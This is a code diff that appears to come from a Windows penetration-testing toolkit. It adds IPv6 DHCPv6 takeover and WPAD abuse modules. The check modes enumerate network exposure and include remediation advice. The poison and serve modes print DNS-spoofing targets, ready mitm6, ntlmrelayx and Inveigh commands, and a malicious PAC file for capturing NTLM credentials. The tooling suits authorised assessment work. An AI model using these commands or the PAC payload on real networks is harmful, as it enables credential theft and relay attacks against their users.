@@ -1793,3 +1793,290 @@ if ($unconstrained.Count -eq 0) { Write-Output "  None found (DCs are expected)"
 
   return { output: output.join("\n"), findings }
 }
+
+export async function mitm6Attack(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const iface = argVal(args, "--interface")
+  const domain = argVal(args, "--domain")
+  const relay = argVal(args, "--relay")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] IPv6 DNS takeover (mitm6-style)...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== IPv6 MITM Vulnerability Assessment ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+Write-Output "[*] Checking IPv6 status on network interfaces..."
+$adapters = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
+foreach ($a in $adapters) {
+    $v6binding = Get-NetAdapterBinding -Name $a.Name -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue
+    $v6enabled = $v6binding.Enabled
+    $v6addrs = Get-NetIPAddress -InterfaceIndex $a.ifIndex -AddressFamily IPv6 -ErrorAction SilentlyContinue |
+        Where-Object { $_.IPAddress -notmatch '^fe80' }
+    $linkLocal = Get-NetIPAddress -InterfaceIndex $a.ifIndex -AddressFamily IPv6 -ErrorAction SilentlyContinue |
+        Where-Object { $_.IPAddress -match '^fe80' }
+
+    Write-Output "    Interface: $($a.Name) ($($a.InterfaceDescription))"
+    Write-Output "    IPv6 Enabled: $v6enabled"
+    Write-Output "    Link-Local: $(if ($linkLocal) { $linkLocal.IPAddress } else { 'None' })"
+    Write-Output "    Global IPv6: $(if ($v6addrs) { ($v6addrs.IPAddress -join ', ') } else { 'None (VULNERABLE to DHCPv6 spoofing)' })"
+    Write-Output ""
+}
+
+Write-Output "=== DHCPv6 Client Status ==="
+$dhcpv6 = Get-Service dhcp -ErrorAction SilentlyContinue
+Write-Output "[*] DHCP Client Service: $(if ($dhcpv6) { $dhcpv6.Status } else { 'Not found' })"
+
+$v6route = Get-NetRoute -AddressFamily IPv6 -ErrorAction SilentlyContinue | Where-Object { $_.DestinationPrefix -eq '::/0' }
+if ($v6route) {
+    Write-Output "[*] Default IPv6 gateway: $($v6route.NextHop) (Interface: $($v6route.InterfaceAlias))"
+} else {
+    Write-Output "[*] No default IPv6 gateway — DHCPv6 spoofing will be accepted"
+}
+
+Write-Output ""
+Write-Output "=== DNS Configuration ==="
+$dnsServers = Get-DnsClientServerAddress -ErrorAction SilentlyContinue
+foreach ($dns in ($dnsServers | Where-Object { $_.ServerAddresses })) {
+    Write-Output "    $($dns.InterfaceAlias): $($dns.ServerAddresses -join ', ') ($($dns.AddressFamily))"
+}
+
+Write-Output ""
+Write-Output "=== Vulnerability Assessment ==="
+$v6Interfaces = Get-NetAdapterBinding -ComponentID ms_tcpip6 -ErrorAction SilentlyContinue | Where-Object { $_.Enabled }
+if ($v6Interfaces) {
+    Write-Output "[!!!] VULNERABLE: IPv6 is enabled on $($v6Interfaces.Count) interface(s)"
+    Write-Output "[*] Attack scenario:"
+    Write-Output "    1. Attacker sends DHCPv6 Advertise with high preference"
+    Write-Output "    2. Victim accepts and configures attacker as IPv6 DNS server"
+    Write-Output "    3. Attacker responds to DNS queries with attacker IP"
+    Write-Output "    4. Victim authenticates to attacker (NTLM/Kerberos)"
+    Write-Output "    5. Relay authentication to LDAP/SMB/HTTP targets"
+    Write-Output ""
+    Write-Output "[*] Combine with: ntlm_relay --action relay for credential relay"
+    Write-Output "[*] Tools: mitm6 (Python), Inveigh (PS/.NET)"
+} else {
+    Write-Output "[+] IPv6 disabled on all interfaces — not vulnerable to DHCPv6 takeover"
+}
+
+Write-Output ""
+Write-Output "=== WPAD Discovery ==="
+$wpadDns = Resolve-DnsName wpad -ErrorAction SilentlyContinue
+if ($wpadDns) {
+    Write-Output "[*] WPAD resolves to: $($wpadDns.IPAddress)"
+    Write-Output "[*] Existing WPAD — spoofing may conflict"
+} else {
+    Write-Output "[!] WPAD does not resolve — DHCPv6 WPAD injection possible"
+    Write-Output "[*] Inject WPAD via DHCPv6 option 252 for proxy credential capture"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-NET-010",
+      provider: "windows",
+      severity: r.stdout.includes("VULNERABLE") ? "high" : "info",
+      status: "ENUMERATED",
+      resource: "network://ipv6-mitm",
+      title: "IPv6 DHCPv6 DNS takeover vulnerability assessment",
+      details: r.stdout.substring(0, 500),
+      remediation: "Disable IPv6 if not needed. Enable DHCPv6 Guard on network switches. Configure Group Policy to prefer IPv4 DNS.",
+    })
+  }
+
+  if (action === "poison") {
+    const targetDomain = domain || (await ps("(Get-ADDomain).DNSRoot", timeout)).stdout.trim()
+    const script = `
+Write-Output "=== IPv6 DNS Poisoning (DHCPv6 + DNS Reply) ==="
+Write-Output "[*] Target domain: ${targetDomain}"
+Write-Output ""
+
+Write-Output "[*] Step 1: Enable IPv6 forwarding..."
+$currentForwarding = (Get-NetIPInterface -AddressFamily IPv6 -ErrorAction SilentlyContinue).Forwarding
+Write-Output "[*] Current IPv6 forwarding: $($currentForwarding | Select-Object -First 1)"
+
+Write-Output ""
+Write-Output "[*] Step 2: Start DHCPv6 server..."
+Write-Output "[*] Advertising ourselves as preferred IPv6 DNS server"
+Write-Output ""
+
+$localV6 = (Get-NetIPAddress -AddressFamily IPv6 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -match '^fe80' } | Select-Object -First 1).IPAddress
+$localV4 = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
+
+Write-Output "[*] Local IPv6 (link-local): $localV6"
+Write-Output "[*] Local IPv4: $localV4"
+Write-Output ""
+
+Write-Output "[*] DNS spoofing configuration:"
+Write-Output "    Domain: ${targetDomain}"
+Write-Output "    Spoofed responses will point to: $localV4"
+Write-Output ""
+Write-Output "[*] High-value DNS targets to spoof:"
+Write-Output "    wpad.${targetDomain} → proxy auto-config for credential capture"
+Write-Output "    *.${targetDomain} → wildcard for all domain lookups"
+Write-Output "    ldap._tcp.${targetDomain} → redirect LDAP for relay"
+Write-Output ""
+
+$relayTarget = '${relay || ""}'
+if ($relayTarget) {
+    Write-Output "[*] Relay target: $relayTarget"
+    Write-Output "[*] Captured NTLM auth will be relayed to $relayTarget"
+} else {
+    Write-Output "[*] No relay target set — credentials will be captured only"
+    Write-Output "[*] Use --relay HOST to auto-relay captured auth"
+}
+
+Write-Output ""
+Write-Output "[!] Full attack requires raw socket access (DHCPv6 = UDP 547)"
+Write-Output "[*] Use Inveigh for PowerShell-native implementation:"
+Write-Output "    Invoke-Inveigh -IP $localV4 -SpooferIPsReply $localV4 -IPv6"
+Write-Output ""
+Write-Output "[*] Or Python mitm6:"
+Write-Output "    mitm6 -d ${targetDomain} -i <interface>"
+Write-Output "    ntlmrelayx.py -6 -t ldaps://<dc> -wh wpad.${targetDomain}"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-NET-011",
+      provider: "windows",
+      severity: "high",
+      status: "ENUMERATED",
+      resource: `network://mitm6/${targetDomain}`,
+      title: `IPv6 DHCPv6 DNS poisoning setup for ${targetDomain}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Disable IPv6 via Group Policy. Enable DHCPv6 Guard. Block WPAD via DNS. Enable LDAP signing and channel binding.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function wpadAbuse(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] WPAD/PAC proxy abuse...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== WPAD Configuration Analysis ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+Write-Output "[*] Proxy auto-detection settings:"
+$proxySettings = Get-ItemProperty "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -ErrorAction SilentlyContinue
+$wpadEnabled = $proxySettings.AutoDetect
+Write-Output "    AutoDetect (WPAD): $(if ($wpadEnabled -eq 1) { 'ENABLED' } else { 'DISABLED' })"
+Write-Output "    AutoConfigURL: $(if ($proxySettings.AutoConfigURL) { $proxySettings.AutoConfigURL } else { 'Not set' })"
+Write-Output "    ProxyServer: $(if ($proxySettings.ProxyServer) { $proxySettings.ProxyServer } else { 'Not set' })"
+Write-Output "    ProxyOverride: $(if ($proxySettings.ProxyOverride) { $proxySettings.ProxyOverride } else { 'Not set' })"
+Write-Output ""
+
+Write-Output "=== WinHTTP Proxy Settings ==="
+$winhttp = & netsh winhttp show proxy 2>&1
+Write-Output $winhttp
+Write-Output ""
+
+Write-Output "=== WPAD DNS Resolution ==="
+$wpadResolve = Resolve-DnsName wpad -ErrorAction SilentlyContinue
+if ($wpadResolve) {
+    Write-Output "[*] wpad resolves to: $($wpadResolve.IPAddress -join ', ')"
+    Write-Output "[*] Existing WPAD server detected"
+} else {
+    Write-Output "[!] wpad does NOT resolve — WPAD spoofing possible"
+}
+
+$fqdn = (Get-WmiObject Win32_ComputerSystem).Domain
+$wpadFqdn = Resolve-DnsName "wpad.$fqdn" -ErrorAction SilentlyContinue
+if ($wpadFqdn) {
+    Write-Output "[*] wpad.$fqdn resolves to: $($wpadFqdn.IPAddress -join ', ')"
+} else {
+    Write-Output "[!] wpad.$fqdn does NOT resolve — domain WPAD spoofing possible"
+}
+
+Write-Output ""
+Write-Output "=== WPAD Attack Vectors ==="
+if ($wpadEnabled -eq 1) {
+    Write-Output "[!!!] WPAD AutoDetect is ENABLED — system actively queries for wpad host"
+    Write-Output ""
+    Write-Output "[*] Attack options:"
+    Write-Output "    1. DNS poisoning: create wpad A record pointing to attacker (adidns_poison)"
+    Write-Output "    2. LLMNR/NBT-NS: respond to wpad name query (responder_poison)"
+    Write-Output "    3. DHCPv6: inject WPAD URL via option 252 (mitm6)"
+    Write-Output ""
+    Write-Output "[*] PAC file payload captures NTLM authentication for relay"
+    Write-Output "[*] Combine with: ntlm_relay for credential relay to LDAP/SMB"
+} else {
+    Write-Output "[+] WPAD AutoDetect is disabled for current user"
+    Write-Output "[*] Check other users — WPAD is enabled by default on fresh Windows installs"
+}
+
+Write-Output ""
+Write-Output "=== Domain-Wide WPAD Status ==="
+try {
+    $gpoWpad = Get-ItemProperty "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings" -ErrorAction SilentlyContinue
+    if ($gpoWpad.AutoDetect -eq 0) {
+        Write-Output "[+] WPAD disabled via Group Policy (machine level)"
+    } elseif ($gpoWpad.AutoDetect -eq 1) {
+        Write-Output "[!] WPAD enabled via Group Policy (machine level)"
+    } else {
+        Write-Output "[*] No machine-level WPAD GPO — per-user setting applies"
+    }
+} catch {
+    Write-Output "[*] No WPAD Group Policy detected"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-NET-012",
+      provider: "windows",
+      severity: r.stdout.includes("!!!") ? "high" : "info",
+      status: "ENUMERATED",
+      resource: "network://wpad",
+      title: "WPAD proxy auto-detection vulnerability assessment",
+      details: r.stdout.substring(0, 500),
+      remediation: "Disable WPAD via Group Policy. Create DNS entry for 'wpad' pointing to nothing. Block DHCPv6 option 252.",
+    })
+  }
+
+  if (action === "serve") {
+    const script = `
+Write-Output "=== WPAD PAC File Server ==="
+Write-Output ""
+Write-Output "[*] PAC file content for NTLM credential capture:"
+Write-Output ""
+
+$localIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress
+Write-Output "function FindProxyForURL(url, host) {"
+Write-Output "    // Force NTLM auth to attacker proxy"
+Write-Output "    return 'PROXY ${localIp}:8080; DIRECT';"
+Write-Output "}"
+Write-Output ""
+Write-Output "[*] Serve this PAC file at: http://$localIp/wpad.dat"
+Write-Output "[*] Clients querying wpad will download this and proxy through us"
+Write-Output "[*] Use ntlm_relay to capture and relay the NTLM authentication"
+Write-Output ""
+Write-Output "[*] Quick serve: python3 -m http.server 80 --bind 0.0.0.0"
+Write-Output "    (place wpad.dat in the serve directory)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-NET-013",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "network://wpad/serve",
+      title: "WPAD PAC file generation for credential interception",
+      details: r.stdout.substring(0, 500),
+      remediation: "Disable WPAD. Monitor for unexpected proxy configurations. Block unknown WPAD servers at network level.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
